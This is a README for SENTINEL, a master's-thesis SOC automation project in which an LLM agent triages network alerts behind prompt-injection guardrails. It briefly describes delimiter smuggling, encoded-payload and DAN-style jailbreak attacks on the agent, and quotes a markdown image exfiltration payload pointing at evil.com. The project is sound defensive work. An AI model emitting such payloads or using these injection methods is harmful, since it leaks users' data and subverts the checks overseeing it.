# SENTINEL: A Cognitive Two-Tier Architecture for Automated Threat Detection and Contextual Response using Agentic AI

[![CI/CD Pipeline](https://github.com/Binhchuoizzz/AI_Security_Graph/actions/workflows/ci.yml/badge.svg)](https://github.com/Binhchuoizzz/AI_Security_Graph/actions/workflows/ci.yml)
[![Security Audit](https://github.com/Binhchuoizzz/AI_Security_Graph/actions/workflows/security.yml/badge.svg)](https://github.com/Binhchuoizzz/AI_Security_Graph/actions/workflows/security.yml)
[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

> **SENTINEL** = **S**treaming **E**vents **N**etwork for **T**hreat **I**ntelligence, **N**eutralization, **E**scalation and **L**og-correlation

A Cognitive Two-Tier Architecture for SOC automation that integrates Session-Aware Behavioral Baselining (Tier 1) with an Agentic AI driven by Dual-RAG and Long-Term Threat Memory (Tier 2). Built as a Master's Thesis to solve the SOC Alert Fatigue paradox.

## Architecture Overview

SENTINEL uses a **2-Tier Funneling Architecture** with strict **Separation of Concerns**:

```text
CSE-CIC-IDS2018 / DAPT2020
        │
  Data Publisher → Redis Stream
        │
  TIER 1 ─ Rule Engine (Session-Aware Behavioral Baselining + IP Blacklist + TTL Eviction)
        │
        ├── benign → [ DROP ]
        │
        └── anomalous → GUARDRAIL LAYER
                           ├── 1. Drain3 Template Mining (Volume Compression)
                           └── 2. Delimited Data Encapsulation (Anti-Injection)
                                    │
                              TIER 2 ─ LangGraph Agent
                                    │
                              ┌─────┴─────┐
                        MITRE ATT&CK    NIST 800-61r2
                        FAISS Index 1   FAISS Index 2
                        (TTP mapping)   (IR playbook)
                              └─────┬─────┘
                                    │
                              Gemma-2-9B-IT (llama.cpp, Q4_K_M)
                                    │
                         ┌──────────┼──────────┐
                     BLOCK_IP   QUARANTINE    ALERT
                         │          │           │
                     Executor   HITL Queue   Dashboard
                                    │
                         ┌──────────┘
                    Feedback Loop → Dynamic Rule Hot-Reload → Tier 1
```

### Core Modules

| # | Component | Role | Layer | Tech Stack |
|---|---|---|---|---|
| **1** | Rule Engine & Session Baseline | Heuristic filter — DROP noise at wire speed | Tier 1 | Python + Redis |
| **2** | Template Miner (Drain3) | Volume Compression ONLY — reduce tokens | Guardrails | Drain3 (simplified) |
| **3** | Prompt Injection Defense | Delimited Data Encapsulation + Encoding Neutralization | Guardrails | `secrets.token_hex()` |
| **4** | Dual-RAG (FAISS + BM25) | Hybrid Search with Reciprocal Rank Fusion | Tier 2 (RAG) | `sentence-transformers` + `faiss-cpu` + `rank_bm25` |
| **5** | LangGraph Agent | Deep analysis, MITRE mapping, action decisions | Tier 2 (Agent) | LangGraph + Gemma-2-9B-IT |
| **6** | Threat Memory | Persistent IP reputation + APT correlation | Tier 2 (Memory) | SQLite |
| **7** | HITL Dashboard | SOC operator interface + rule approval queue | UI | Streamlit + RBAC |

## 🛡️ Core Novelty & Defenses

### Delimited Data Encapsulation (Adversarial Defense)
- **Dynamic Randomized Delimiters:** Each request generates a new delimiter using `secrets.token_hex()`. Prevents *Delimiter Smuggling*.
- **Encoding Neutralization:** Intercepts Base64/Hex/URL-encoded/Unicode before LLM inference.
- **Jailbreak Detection:** Pattern-based + behavioral scoring for DAN/roleplay-style attacks.

### HITL Quarantine (Adversarial Rule Injection Defense)
- Agent auto-generates new rules but they are placed in **Quarantine (Pending Approval)**.
- Streamlit Dashboard with RBAC routes rules to L3 Manager before hot-reloading into Tier 1.

### Output Sanitizer (Data Exfiltration Defense)
- Strips Markdown/HTML image tags from LLM output to prevent indirect data exfiltration via `![](https://evil.com/steal?data=...)`.

## 📊 5D Evaluation Framework (v2_5D)

| Dimension | Target | Statistical Test | Script |
|---|---|---|---|
| **1. Classification** | F1 ≥ 0.90 | McNemar's Test (p<0.05) | `experiments/run_ablation_study.py` |
| **2. Operational** | Latency Reduction ≥ 60% | Mann-Whitney U Test (p<0.05) | `experiments/measure_latency_baseline.py` |
| **3. Robustness** | Guardrail Defeat Rate < 10% | 45 curated adversarial samples | `experiments/evaluate_robustness.py` |
| **4. Context Quality** | RAGAS Context Relevance ≥ 0.85 | Cross-family LLM-as-Judge (Llama-3.1-8B judges Gemma-2-9B) | `experiments/evaluate_reasoning.py` |
| **5. Explainability** | Audit Trail Completeness 100% | Deterministic field presence check | `experiments/evaluate_reasoning.py` |

## 📂 Datasets

| Dataset | Purpose | Size |
|---|---|---|
| **CSE-CIC-IDS2018** | Tier 1 network traffic (14 attack types + benign) | ~16M rows, 10 CSV files |
| **DAPT2020** | Tier 2 APT multi-day attack chains | 5 days, 7,276 rows, 197 chains |
| **MITRE ATT&CK** | RAG Index 1 — tactical TTP mapping | FAISS + BM25 index |
| **NIST SP 800-61r2** | RAG Index 2 — incident response playbook | 193 vectors, IR-phase-specific |
| **Ground Truth** | Evaluation benchmark | 750 samples, 15 classes |
| **Adversarial Samples** | Guardrail robustness testing | 45 samples, 3 categories |

## 📁 Project Structure

```
AI_Security_Graph/
├── config/
│   ├── ablation/                     # 6 YAML configs (A-F) for ablation study
│   ├── system_settings.yaml          # Central config (Tier1, Guardrails, RAG, Redis)
│   ├── audit_trail.db                # SQLite audit trail (auto-created)
│   └── threat_memory.db              # SQLite threat memory (auto-created)
├── data/
│   ├── raw/cicids2018/               # CSE-CIC-IDS2018 CSV files
│   ├── raw/dapt2020/                 # DAPT2020 APT dataset (5 days)
│   ├── knowledge/                    # NIST 800-61r2 source PDF/TXT
│   └── processed/                    # DAPT2020 pre-built chains
├── experiments/
│   ├── adversarial/                  # 3 attack categories with samples
│   ├── ground_truth.json             # 750 evaluation samples
│   ├── adversarial_samples.json      # 45 adversarial test samples
│   ├── run_ablation_study.py         # Ablation study (6 configs)
│   ├── evaluate_robustness.py        # Guardrail defeat rate evaluation
│   ├── evaluate_reasoning.py         # Cross-family LLM-as-Judge
│   ├── statistical_tests.py          # McNemar + Mann-Whitney U
│   ├── measure_latency_baseline.py   # Two-Tier vs LLM-only latency
│   └── e2e_test_runner.py            # 20 component validation tests
├── knowledge_base/
│   ├── mitre_attack.json             # MITRE ATT&CK knowledge source
│   ├── nist_800_61r2.json            # NIST 800-61r2 knowledge source
│   └── faiss_index/                  # FAISS + BM25 indexes (6 files)
├── src/
│   ├── streaming/                    # Redis Pub/Sub (publisher.py, subscriber.py)
│   ├── tier1_filter/                 # Rule Engine + Session Baseline + Feedback Loop
│   ├── guardrails/                   # Template Miner + Prompt Filter + Output Sanitizer
│   ├── rag/                          # Dual-RAG Retriever + Embedder + Semantic Cache
│   ├── agent/                        # LangGraph Workflow + Nodes + LLM Client + Threat Memory
│   ├── response/                     # Action Executor + Audit Trail
│   └── ui/                           # Streamlit Dashboard + RBAC Auth
├── tests/
│   ├── unit/                         # Unit tests (pytest)
│   └── integration/                  # Integration tests
├── main.py                           # CLI entry point (--mode server|scan|full)
├── requirements.txt                  # Python dependencies
├── Dockerfile                        # Container build
└── docker-compose.yml                # Full infrastructure stack
```

## 🚀 Quick Start

See [RUN_PROJECT.md](RUN_PROJECT.md) for detailed step-by-step instructions.

### 1. Setup Environment
```bash
git clone https://github.com/Binhchuoizzz/AI_Security_Graph.git
cd AI_Security_Graph
python3.10 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
cp .env.example .env
```

### 2. Build RAG Indexes (First Time Only)
```bash
python src/rag/embedder.py
```

### 3. Run E2E Validation (No LLM Required)
```bash
python experiments/e2e_test_runner.py --offline
```

### 4. Run Full Pipeline (Requires Redis + LLM Server)
```bash
docker-compose up -d redis
# Start llama.cpp server with Gemma-2-9B-IT on port 5000
python main.py --mode server
```

### 5. Launch HITL Dashboard
```bash
streamlit run src/ui/app.py
```

## 💻 Hardware Requirements

| Component | Minimum | Details |
|---|---|---|
| GPU | NVIDIA RTX 4060 Ti 16GB VRAM | Gemma-2-9B-IT Q4_K_M (~6GB) + KV Cache |
| RAM | 32GB | Streaming cache + FAISS indexes |
| OS | Linux (Ubuntu 22.04+) | — |

## 📝 License & Authorship

MIT License. See [LICENSE](LICENSE) for details.

**Author**: Nguyễn Đức Bình — Master's Candidate in AI & Machine Learning.
